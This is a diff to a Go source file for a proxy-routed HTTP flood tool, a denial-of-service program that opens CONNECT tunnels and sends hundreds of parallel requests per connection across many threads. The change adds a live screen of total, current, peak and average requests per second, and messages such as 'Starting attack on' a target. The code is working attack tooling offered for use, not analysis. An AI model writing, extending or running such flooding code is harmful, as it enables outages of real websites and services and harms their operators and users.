@@ -1,5 +1,5 @@
 package main
-
+// r
 import (
     "crypto/tls"
     "flag"
@@ -152,7 +152,6 @@ func sendRequest(proxyAddr, target string) {
     }
     defer conn.Close()
 
-    // CONNECT request
     fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n", parsedURL.Host, parsedURL.Host)
     buf := make([]byte, 4096)
     _, err = conn.Read(buf)
@@ -160,7 +159,6 @@ func sendRequest(proxyAddr, target string) {
         return
     }
 
-    // Wrap connection with TLS
     rawConn, _ := conn.(*net.TCPConn)
     rawConn.SetKeepAlive(true)
     rawConn.SetKeepAlivePeriod(30 * time.Second)
@@ -168,7 +166,6 @@ func sendRequest(proxyAddr, target string) {
     client := clientPool.Get().(*http.Client)
     defer clientPool.Put(client)
 
-    // Send requests in parallel
     var wg sync.WaitGroup
     for i := 0; i < 500; i++ {
         wg.Add(1)
@@ -222,7 +219,7 @@ func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
     }
 }
 
-func monitorStats(stopChan chan struct{}) {
+func monitorStats(startTime time.Time, stopChan chan struct{}) {
     ticker := time.NewTicker(time.Second)
     defer ticker.Stop()
     var lastCount uint64
@@ -233,24 +230,37 @@ func monitorStats(stopChan chan struct{}) {
             return
         case <-ticker.C:
             current := atomic.LoadUint64(&requestCount)
+            elapsed := time.Since(startTime).Seconds()
             rps := current - lastCount
             if rps > peakRPS {
                 atomic.StoreUint64(&peakRPS, rps)
             }
-            lastCount = current
+            avgRPS := float64(current) / elapsed
+
+            // Clear previous output and print all stats
+            fmt.Print("\033[2J\033[1;1H") // ANSI escape codes to clear screen and move cursor to top
+            fmt.Printf("Target: %s\n", targetURL)
+            fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
+            fmt.Printf("Total Requests: %d\n", current)
             fmt.Printf("Current RPS: %d\n", rps)
+            fmt.Printf("Peak RPS: %d\n", peakRPS)
+            fmt.Printf("Average RPS: %.2f\n", avgRPS)
+
+            lastCount = current
         }
     }
 }
 
 func main() {
     rand.Seed(time.Now().UnixNano())
+    startTime := time.Now()
     stopChan := make(chan struct{})
     var wg sync.WaitGroup
 
     fmt.Printf("Starting attack on %s with %d threads for %d seconds\n", targetURL, threads, duration)
+    fmt.Println("Stats will update every second...")
 
-    go monitorStats(stopChan)
+    go monitorStats(startTime, stopChan)
 
     for i := 0; i < threads; i++ {
         wg.Add(1)
@@ -261,12 +271,17 @@ func main() {
     close(stopChan)
     wg.Wait()
 
+    // Final stats
     total := atomic.LoadUint64(&requestCount)
-    avgRPS := float64(total) / float64(duration)
-    peak := atomic.LoadUint64(&peakRPS)
+    elapsed := time.Since(startTime).Seconds()
+    avgRPS := float64(total) / elapsed
 
-    fmt.Printf("\nAttack completed\n")
+    fmt.Print("\033[2J\033[1;1H") // Clear screen for final output
+    fmt.Println("Attack completed")
+    fmt.Printf("Target: %s\n", targetURL)
+    fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
     fmt.Printf("Total Requests: %d\n", total)
+    fmt.Printf("Current RPS: 0\n")
+    fmt.Printf("Peak RPS: %d\n", peakRPS)
     fmt.Printf("Average RPS: %.2f\n", avgRPS)
-    fmt.Printf("Peak RPS: %d\n", peak)
 }
